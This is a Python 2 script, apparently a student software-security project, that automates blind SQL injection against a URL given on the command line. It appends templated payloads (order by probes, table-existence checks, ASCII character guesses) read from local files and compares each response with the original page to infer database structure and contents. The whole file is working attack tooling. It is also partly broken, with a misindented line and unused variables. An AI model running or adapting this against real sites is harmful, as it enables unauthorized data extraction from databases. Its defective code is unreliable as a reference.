#!/usr/bin/env python

######################################################
# Project: Blind SQL Injection Exploit Automation
# Authors: Shruti Sonawane, Devanshi Panu
######################################################

import os
import sys
import urllib



def main(argv, req=None):
    print "Starting excavator.............."

    attackURL = ''
    '''values = {'q': attackURL}
    data = urllib.urlencode(values)
    req = Request(argv[1], data)'''
    url = argv[1]
    origres = urllib.urlopen(url).read()
    # origres = urllib2.urlopen(Request(attackURL)).read()
    # reading possible column values from file into HashMap
    columnMap = {}
    try:
    os.chdir("~/SoftwareSecurityBSQL")
        columnFile = open("PossibleColumnNames")
        for x, line in enumerate(columnFile):
            possibleColumns = line.split(':')
            columnMap[possibleColumns[0]] = possibleColumns[1]

        # creating payloads that dont need specific columnname or table name
        queryFile = open("PossibleQueries")
        for y, line in enumerate(queryFile):
            if (not ("column" in line) and not ("table" in line) and not ("number" in line)):
                attackURL = " " + line.strip('\n')  # print line
                # attackURL = " " + line.strip('\n')  # print line
                res = sendAttackURL(argv[1], attackURL)
                chk = checkResponse(res, origres)


        # creating order by payloads
        queryFile = open("PossibleQueries")
        for y, line in enumerate(queryFile):
            if ("order by number" in line):
                for i in range(1, 51):
                    line = line.replace("number", "%s")
                    attackURL = " " + line.strip('\n') % (str(i))  # print line % (str(i))
                    # attackURL = " " + line.strip('\n') % (str(i))  # print line % (str(i))
                    res = sendAttackURL(argv[1], attackURL)
                    chk = checkResponse(res, origres)
                    if chk == "FAILURE":
                        break

        # reading possible table values from file
        tableFile = open("PossibleTables")
        fascii = False
        ftable = False
        fcolumn = False
        for x, possibleTable in enumerate(tableFile):
            tables = possibleTable.split()
            columns = columnMap[tables[0]]
            columnList = columns.split(',')
            for z, col in enumerate(columnList):
                # reading possible query templates from file
                queryFile = open("PossibleQueries")
                for y, line in enumerate(queryFile):
                    if (("column" in line) or ("table" in line) or ("ascii" in line)):
                        if "table" in line:
                            if (line == "and (select 1 from table limit 0,1)=1 --"):
                                line = line.replace("table", tables[0])
                                attackURL = " " + line
                                res = sendAttackURL(argv[1], attackURL.strip('\n'))
                                chk = checkResponse(res, origres)
                                if chk == "FAILURE":
                                    savdhaan = True
                                    break
                                line = line.replace("table", tables[0])
                                ftable = True
                        if "column" in line:
                            line = line.replace("column", col)
                            fcolumn = True
                        if "ascii" in line:
                            for i in range(32, 128):
                                line = line.replace("ascii", "{0}")
                                fascii = True
                                line = line.format(str(i))
                        attackURL = " " + line                 # print line.format(str(i))
                        res = sendAttackURL(argv[1], attackURL.strip('\n'))
                        chk = checkResponse(res, origres)

                    else:
                        continue
    except Exception as e:
        print e, "Something went wrong!"


def sendAttackURL(args1, attackURL):
    #values = {'q': attackURL}
    #data = urllib.urlencode(values)
    #req = Request(args1, data)
    #print req.get_data()
    response = urllib.urlopen(args1 + ' {}'.format(attackURL)).read()
    print attackURL
    return response


def checkResponse(res, origres):
    # d = difflib.Differ()
    # print list(d.compare(res, origres))
    # sys.exit(0)
    if res == origres:
        print "SUCCESS"
        return "SUCCESS"
    else:
        print "FAILURE"
        return "FAILURE"
        # sys.exit(0)


if __name__ == '__main__':
    main(sys.argv)
